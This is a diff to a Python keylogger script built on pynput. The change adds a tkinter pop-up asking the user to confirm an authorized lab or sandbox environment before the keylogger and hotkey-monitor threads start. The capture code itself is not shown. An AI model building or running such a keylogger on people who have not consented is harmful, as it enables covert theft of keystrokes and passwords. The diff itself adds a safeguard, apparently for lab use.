@@ -1,3 +1,5 @@
+import tkinter as tk
+from tkinter import messagebox
 from pynput import keyboard
 from datetime import datetime
 import threading
@@ -48,7 +50,25 @@ def monitor_hotkey():
     }) as h:
         h.join()
 
+def show_authorization_message():
+    # Warning pop-up to notify users
+    root = tk.Tk()
+    root.withdraw()
+
+    message = (
+        "This keylogger is designed to only be used for authorized lab virtual machines "
+        "and sandbox environments. Do you confirm that this is an authorized environment?"
+    )
+
+    result = messagebox.askyesno("Environment Authorization", message)
+
+    if not result: messagebox.showinfo("Exit", "You did not confirm. The program will now exit.");
+    root.destroy()
+    return result
+
 if __name__ == "__main__":
     # Start keylogger and hotkey monitor in separate threads
-    threading.Thread(target=start_keylogger, daemon=True).start()
-    monitor_hotkey()
+    if show_authorization_message():
+        threading.Thread(target=start_keylogger, daemon=True).start()
+        monitor_hotkey()
+
